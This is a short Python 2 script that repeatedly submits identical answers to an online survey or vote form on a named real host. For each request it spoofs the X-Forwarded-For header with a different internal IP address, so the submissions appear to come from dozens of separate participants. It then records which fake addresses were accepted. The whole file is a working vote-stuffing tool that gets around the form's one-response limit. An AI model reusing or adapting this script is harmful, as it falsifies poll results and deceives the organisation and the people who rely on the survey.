# -*- coding: utf-8 -*-
import json
import requests
import time
import sys
default_encoding = 'utf-8'
if sys.getdefaultencoding() != default_encoding:
    reload(sys)
    sys.setdefaultencoding(default_encoding)

url = 'http://wan.lc.sd.sgcc.com.cn:8088/vote/questions/6/answer.shtml'

payload1="status_504=%E6%82%A8%E5%B7%B2%E7%BB%8F%E5%8F%82%E4%B8%8E%E8%BF%87%E8%B0%83%E6%9F%A5&redirectUrl=%2Fvote%2Fquestions%2F6%2Fresult.shtml&item_38=103&item_39=107&item_40=109&item_41=115&item_42=119&item_43=123&item_44=127&item_45=128&item_46=135&item_47=138"
for i in range(7,53):
    headers = {'X-Forwarded-For': '10.140.101.%s'%i,
               "User - Agent": "Mozilla / 5.0(Windows NT 10.0;WOW64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 54.0  .2840.99 Safari / 537.36",
               "Referer": "http: //wan.lc.sd.sgcc.com.cn:8088/vote/node/99.shtml"}
    r = requests.post(url, data=payload1, headers=headers)
    #print r.text
    if "成功" in str(r.text):
        print '10.140.101.%s'%i
    time.sleep(3)
    #break
